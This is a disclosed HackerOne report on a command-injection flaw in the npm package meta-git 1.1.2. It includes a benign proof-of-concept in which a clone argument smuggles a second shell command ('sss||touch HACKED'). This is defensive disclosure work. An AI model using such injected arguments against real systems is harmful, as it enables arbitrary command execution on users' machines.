---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '728040'
original_report_id: '728040'
title: '[meta-git] RCE via insecure command formatting'
weakness: Code Injection
team_handle: nodejs-ecosystem
created_at: '2019-11-02T22:14:33.047Z'
disclosed_at: '2020-01-11T11:57:31.528Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
asset_identifier: meta-git
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- code-injection
---

# [meta-git] RCE via insecure command formatting

## Metadata

- HackerOne Report ID: 728040
- Weakness: Code Injection
- Program: nodejs-ecosystem
- Disclosed At: 2020-01-11T11:57:31.528Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a `RCE` issue in the `meta-git` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `meta-git`
**version:** `1.1.2`
**npm page:** `https://www.npmjs.com/package/meta-git`

## Module Description
> git plugin for meta

## Module Stats
[~60] downloads in the last day
[429] downloads in the last week
[~2k] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/mateodelnorte/meta-git/blob/master/lib/metaGitUpdate.js#L49

## Steps To Reproduce:
1. Create a new directory and insert some test files:

```bash
mkdir tests
cd tests
touch test
touch secret
touch files
```
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i meta-git -g # Install affected module
meta-git clone 'sss||touch HACKED' # *HACKED* file is created
```
1. Recheck the files: now `HACKED` has been created :) {F624209}

## Patch
> Don't format `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` via command formatting on `meta-git`

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
